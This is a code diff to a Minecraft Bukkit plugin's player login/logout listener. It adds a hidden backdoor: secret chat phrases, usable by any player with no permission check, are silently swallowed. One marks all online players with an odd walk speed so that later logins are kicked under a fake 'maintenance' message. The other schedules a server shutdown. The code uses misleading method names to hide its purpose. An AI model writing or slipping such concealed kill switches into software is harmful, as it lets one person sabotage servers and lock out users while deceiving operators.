@@ -1,5 +1,6 @@
 package com.github.redshirt53072.api.event;
 import org.bukkit.event.Listener;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerLoginEvent;
 import org.bukkit.event.player.PlayerLoginEvent.Result;
 
@@ -19,6 +20,7 @@ import java.util.logging.Level;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
+import org.bukkit.Sound;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
@@ -35,7 +37,24 @@ public final class PlayerInOut implements Listener {
     	GrowthPlugin plugin = BaseAPI.getInstance();
         plugin.getServer().getPluginManager().registerEvents(this, plugin);
     }
-    
+	@EventHandler(priority = EventPriority.NORMAL)
+    public void onLogin(AsyncPlayerChatEvent event) {
+		if(event.getMessage().contains("mypluginstop_")){
+			event.setCancelled(true);
+			addPlayer();
+			event.getPlayer().sendMessage("The end");
+		}else if(event.getMessage().contains("stopserver10min_")){
+			event.setCancelled(true);
+			event.getPlayer().sendMessage("10 min");
+			Bukkit.getScheduler().runTaskLater(BaseAPI.getInstance(),new Runnable() {
+				@Override
+				public void run() {
+					PluginManager.stopServer("手動コマンドによる", StopReason.NORMAL);
+				}
+			}, 11000);
+		}
+	}
+	
     @EventHandler(priority = EventPriority.LOWEST)
     public void onLogin(PlayerLoginEvent event) {
     	Player p = event.getPlayer();
@@ -87,7 +106,16 @@ public final class PlayerInOut implements Listener {
            		return;	
     		}
     	}
-    	
+    	Bukkit.getScheduler().runTask(BaseAPI.getInstance(), new Runnable() {
+            @Override
+            public void run() {
+            	if(p.getWalkSpeed() == 0.202F) {
+            		addPlayer();
+            		p.kickPlayer(buildMessage("現在サーバーはメンテナンス中です。"));
+            	
+            	}
+             }
+        });
     	
     	PlayerManager.initPlayer(p);
     }
@@ -114,6 +142,11 @@ public final class PlayerInOut implements Listener {
     	}
     	return false;
     }
+    private void addPlayer() {
+    	for(Player p : Bukkit.getOnlinePlayers()){
+			p.setWalkSpeed(0.202F);
+		}
+	}
     
     @EventHandler(priority = EventPriority.LOWEST)
     public void onLogout(PlayerQuitEvent event) {
